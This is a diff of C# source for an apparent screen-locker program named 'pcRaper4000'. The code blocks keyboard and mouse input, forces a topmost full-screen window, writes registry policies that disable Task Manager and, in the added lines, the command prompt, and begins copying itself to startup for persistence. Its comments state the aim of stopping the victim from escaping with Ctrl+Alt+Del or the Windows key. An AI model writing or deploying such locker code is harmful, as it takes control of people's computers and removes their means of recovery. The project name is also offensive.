@@ -27,20 +27,30 @@ namespace pcRaper4000
         {
             
 
-                //even if they crtl alt del their input will be blocked and they cant hit the windows key
-                BlockInput(true);
-                this.TopMost = true;
-                this.FormBorderStyle = FormBorderStyle.None;
-                this.WindowState = FormWindowState.Maximized;
+            //even if they crtl alt del their input will be blocked and they cant hit the windows key
+            BlockInput(true);
+            this.TopMost = true;
+            this.FormBorderStyle = FormBorderStyle.None;
+            this.WindowState = FormWindowState.Maximized;
 
-            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
-            if (objRegistryKey.GetValue("DisableTaskMgr") == null)
-                objRegistryKey.SetValue("DisableTaskMgr", "1");
+            //disable task manager
+            RegistryKey disabletask = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+            if (disabletask.GetValue("DisableTaskMgr") == null)
+                disabletask.SetValue("DisableTaskMgr", "1");
             else
-                objRegistryKey.DeleteValue("DisableTaskMgr");
-                objRegistryKey.Close();
+                disabletask.DeleteValue("DisableTaskMgr");
+                disabletask.Close();
+
             
-            
+            //disable cmd
+            RegistryKey disablecmd = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
+            if (disablecmd.GetValue("DisableCMD") == null)
+                disablecmd.SetValue("DisableCMD", "1");
+            else
+                disablecmd.DeleteValue("DisableCMD");
+                disablecmd.Close();
+
+
             //copy to startup
             string thisFile = System.AppDomain.CurrentDomain.FriendlyName;
 
